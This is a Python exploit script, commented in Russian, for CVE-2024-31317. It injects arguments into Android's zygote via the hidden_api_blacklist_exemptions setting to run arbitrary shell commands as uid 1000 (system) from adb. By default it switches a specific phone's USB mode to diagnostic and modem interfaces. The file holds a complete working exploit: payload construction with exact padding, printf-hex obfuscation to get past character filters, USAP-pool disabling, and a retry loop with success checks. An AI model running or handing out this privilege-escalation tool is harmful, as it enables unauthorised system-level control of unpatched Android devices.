#!/usr/bin/env python3
"""Исполнение произвольной команды от uid=1000 через CVE-2024-31317.

CVE-2024-31317 — инъекция аргументов в zygote через глобальную настройку
hidden_api_blacklist_exemptions. Работает от adb shell (uid 2000):
код исполняется как uid=1000(system).

Без аргументов -- проверенное действие: переключение USB-композиции
телефона в diag,modem,adb (A101BM 1.280PO.0686.a, SPL 2022-10-01).
На прошивках с патчем 2024-05 работать НЕ будет.

Режимы:
  (без аргументов)      переключить USB в diag,modem,adb (как раньше)
  --cmd 'CMD'           выполнить произвольную команду от uid=1000
  --log-tag TAG         обернуть --cmd: 'CMD 2>&1 | /system/bin/log -t TAG'
                        (вывод смотреть: adb logcat -s TAG)
  --check-prop P=V      критерий успеха: getprop P равен V
  --check-file PATH     критерий успеха: файл PATH существует
  --check-log TAG:MARK  критерий успеха: в logcat (logcat -d -s TAG) есть MARK
  --encode 'STRING'     конвертер: строка -> printf-экранирование
                        (печатает результат и выходит; adb не нужен)

Формат payload (critical):
  - команда sh, БЕЗ запятых, БЕЗ кавычек, ОБЯЗАТЕЛЬНО оканчивается " ;"
    (WrapperInit дописывает хвост; без " ;" команда не выполнится).
    Скрипт дописывает " ;" сам, если его нет.
  - запятые/кавычки/пробелы в СТРОКАХ кодируются printf-обфускацией:
    'diag,modem,adb' -> $(printf \\x64\\x69...). Готовое экранирование
    выдаёт --encode: подставьте его фрагмент внутрь --cmd.
  - ДВОЙНОЙ бэкслеш в python-строке: '\\\\x64' -> в payload '\\x64' -> printf 'd'

USAP: если инъекции молча не срабатывают, отключить USAP-пул:
  adb shell device_config put activity_manager native_usap_pool_enabled false
  затем несколько раз пересоздать приложение (скрипт делает это сам).
"""
from __future__ import annotations

import argparse
import subprocess
import sys
import time
from pathlib import Path

# 3000 "\\n" + 5157 "A" + ядро + "," + 1400 "\\n," — проверенный формат (oddbyte)
PREFIX = "\n" * 3000 + "A" * 5157
SUFFIX = "," + "\n," * 1400

FORBIDDEN = {
    ",": "запятые запрещены протоколом (закодируйте через --encode)",
    '"': 'двойные кавычки запрещены (закодируйте через --encode)',
    "'": "одинарные кавычки запрещены (закодируйте через --encode)",
}


def build_core(cmdline: str, gid: int = 1000, groups: str = "0") -> str:
    # 11 в счётчике при 12 строках — скопировано 1:1 из рабочего эксплойта
    return (
        "11\n"
        "--seinfo=platform:privapp:targetSdkVersion=29:complete\n"
        "--runtime-args\n"
        "--invoke-with\n"
        f"{cmdline}\n"
        "--setuid=1000\n"
        f"--setgid={gid}\n"
        f"--setgroups={groups}\n"
        "--mount-external-android-writable\n"
        "--runtime-flags=43267\n"
        "--target-sdk-version=29\n"
        "--package-name=com.google.android.gms\n"
        "android.app.ActivityThread"
    )


def build_payload(cmdline: str, gid: int = 1000, groups: str = "0") -> str:
    core = build_core(cmdline, gid, groups)
    for ch, why in FORBIDDEN.items():
        assert ch not in cmdline, f"символ {ch!r}: {why}"
    assert "," not in groups, "список групп через запятую запрещён протоколом"
    assert cmdline.rstrip().endswith(" ;"), "команда обязана оканчиваться ' ;'"
    return PREFIX + core + SUFFIX


def esc_printf(s: str) -> str:
    """Строка -> uniform \\xNN-экранирование каждого байта UTF-8."""
    return "".join(f"\\x{b:02x}" for b in s.encode("utf-8"))


def normalize_cmd(cmd: str, log_tag: str | None) -> str:
    cmd = cmd.rstrip()
    if log_tag:
        cmd = f"{cmd} 2>&1 | /system/bin/log -t {log_tag}"
    if not cmd.endswith(" ;"):
        cmd += " ;"
    return cmd


def sh(adb: list[str], cmd: str, timeout: int = 30) -> str:
    r = subprocess.run(adb + ["shell", cmd], capture_output=True, text=True,
                       encoding="utf-8", errors="replace", timeout=timeout)
    return (r.stdout or "") + (r.stderr or "")


def encode_and_print(s: str) -> None:
    esc = esc_printf(s)
    print(f"оригинал : {s}")
    print(f"экран    : {esc}")
    print(f"фрагмент : $(printf {esc})")
    print(f"python   : \"{esc.replace(chr(92), chr(92) * 2)}\"")
    print("подставьте 'фрагмент' внутрь --cmd; запятые/кавычки/пробелы внутри")
    print("экранированы, ограничение протокола не нарушается.")


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2024-31317: команда от uid=1000 (по умолчанию — USB в diag,modem,adb)")
    ap.add_argument("--adb", default="adb", help="путь к adb (Linux: adb; Windows: adb.exe)")
    ap.add_argument("--attempts", type=int, default=12, help="число попыток инъекции")
    ap.add_argument("--gid", type=lambda s: int(s, 0), default=1000,
                    help="gid процесса (--setgid; например 9997 для доступа к /sdcard)")
    ap.add_argument("--groups", default="0",
                    help="доп. группы (--setgroups), одно значение БЕЗ запятых")
    ap.add_argument("--cmd", help="произвольная команда uid=1000 (без , и кавычек; ' ;' допишется)")
    ap.add_argument("--log-tag", metavar="TAG",
                    help="обернуть --cmd выводом в logcat: ... | /system/bin/log -t TAG")
    ap.add_argument("--check-prop", metavar="PROP=VALUE",
                    help="критерий успеха: getprop PROP == VALUE")
    ap.add_argument("--check-file", metavar="PATH",
                    help="критерий успеха: файл PATH существует на устройстве")
    ap.add_argument("--check-log", metavar="TAG:MARK",
                    help="критерий успеха: в logcat (logcat -d -s TAG) есть MARK; "
                         "MARK выбирайте уникальным на этот запуск")
    ap.add_argument("--encode", metavar="STRING",
                    help="конвертер строка -> printf-экранирование, печатает и выходит")
    a = ap.parse_args()

    if a.encode is not None:
        encode_and_print(a.encode)
        return 0
    if a.log_tag and not a.cmd:
        ap.error("--log-tag применим только вместе с --cmd")

    adb = [a.adb]

    # --- собираем команду и критерий успеха -------------------------------
    if a.cmd:
        cmd = normalize_cmd(a.cmd, a.log_tag)
        print(f"[*] команда (uid=1000): {cmd}")
        for ch, why in FORBIDDEN.items():
            if ch in a.cmd:
                print(f"Ошибка: символ {ch!r} в --cmd — {why}", file=sys.stderr)
                return 1
        if a.check_prop:
            if "=" not in a.check_prop:
                ap.error("--check-prop ожидает формат PROP=VALUE")
            prop, value = a.check_prop.split("=", 1)

            def check() -> tuple[bool, str]:
                cur = sh(adb, f"getprop {prop}").strip()
                return cur == value, f"{prop}={cur!r}"
        elif a.check_file:

            def check() -> tuple[bool, str]:
                out = sh(adb, f"test -f {a.check_file} && echo ok").strip()
                return out == "ok", f"{a.check_file}: {'есть' if out == 'ok' else 'нет'}"
        elif a.check_log:
            if ":" not in a.check_log:
                ap.error("--check-log ожидает формат TAG:MARK")
            ltag, lmark = a.check_log.split(":", 1)

            def check() -> tuple[bool, str]:
                out = sh(adb, f"logcat -d -s {ltag}")
                return lmark in out, f"лог {ltag}: маркер {'найден' if lmark in out else 'не найден'}"
        else:
            def check() -> tuple[bool, str]:
                return False, "нет критерия (используйте --check-prop/--check-file/--check-log)"
    else:
        # строка 'diag,modem,adb' без запятых: $(printf \x64\x69...) — в payload
        # должно попасть ровно по ОДНОМУ бэкслешу на \x, поэтому в python '\\\\x'
        cmd = ("setprop sys.usb.config $(printf "
               "\\\\x64\\\\x69\\\\x61\\\\x67\\\\x2c\\\\x6d\\\\x6f\\\\x64\\\\x65\\\\x6d"
               "\\\\x2c\\\\x61\\\\x64\\\\x62) ; ")
        prop, value = "sys.usb.config", "diag,modem,adb"

        def check() -> tuple[bool, str]:
            cur = sh(adb, "getprop sys.usb.config").strip()
            return cur == value, f"sys.usb.config={cur!r}"

    payload = build_payload(cmd, a.gid, a.groups)

    print("[1/5] ждём устройство в adb...")
    for _ in range(20):
        out = sh(adb, "getprop sys.boot_completed").strip()
        if out.startswith("1"):
            break
        time.sleep(3)
    else:
        print("Ошибка: телефон не загрузился/не виден в adb", file=sys.stderr)
        return 1

    # baseline: критерий, выполненный ДО инъекций, -- ложноположительный
    # оракул (например, свойство уже имеет нужное значение); честно отказываемся
    ok0, status0 = check()
    if ok0:
        if not a.cmd:
            print(f"ГОТОВО без инъекций: {status0} (композиция уже активна).")
            return 0
        print("Ошибка: критерий успеха уже выполнен ДО инъекций "
              f"({status0}). Такой оракул не отличит работу команды от "
              "текущего состояния: выберите индикатор, который МЕНЯЕТ "
              "команда (другое свойство/файл, либо --check-log с уникальным "
              "маркером в выводе команды).", file=sys.stderr)
        return 1

    print("[2/5] отключаем USAP-пул (лечит 'молчаливые' отказы инъекции)...")
    sh(adb, "device_config put activity_manager native_usap_pool_enabled false")

    print("[3/5] собираю payload...")
    p = Path("p31317.txt")
    p.write_text(payload, encoding="utf-8")
    print(f"      payload: {len(payload)} байт -> {p}")

    print("[4/5] push payload...")
    r = subprocess.run(adb + ["push", str(p), "/data/local/tmp/p31317.txt"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print("push не удался:", r.stderr, file=sys.stderr)
        return 1

    print("[5/5] инъекции (вероятностные)...")
    for i in range(1, a.attempts + 1):
        sh(adb, "am force-stop com.android.settings 2>/dev/null")
        sh(adb, 'P="$(cat /data/local/tmp/p31317.txt)"'
                ' && settings put global hidden_api_blacklist_exemptions "$P"'
                ' && settings put global hidden_api_blacklist_exemptions "*"')
        sh(adb, "am start -n com.android.settings/.Settings >/dev/null 2>&1")
        time.sleep(3)
        sh(adb, "settings delete global hidden_api_blacklist_exemptions >/dev/null 2>&1")
        ok, status = check()
        print(f"  попытка {i}: {status}")
        if ok:
            print("ГОТОВО: команда выполнена (критерий выполнен).")
            if not a.cmd:
                print("Диаг-композиция активна, USB переенумерировался.")
                print("Windows: подождите установку драйвера; Linux: lsusb должен")
                print("показать 0482:0a9d. Далее см. guide/03 или 04.")
            elif a.log_tag:
                print(f"Вывод команды: adb logcat -s {a.log_tag}")
            return 0

    if a.cmd and not (a.check_prop or a.check_file or a.check_log):
        print("Попытки исчерпаны; критерий успеха не задан — проверьте эффект")
        print("вручную (например, adb logcat -s TAG или состояние устройства).")
        return 0
    print("Не удалось за отведённое число попыток. Перезагрузите телефон",
          "и повторите (после ребута USAP-пул пуст — первые попытки легче).",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
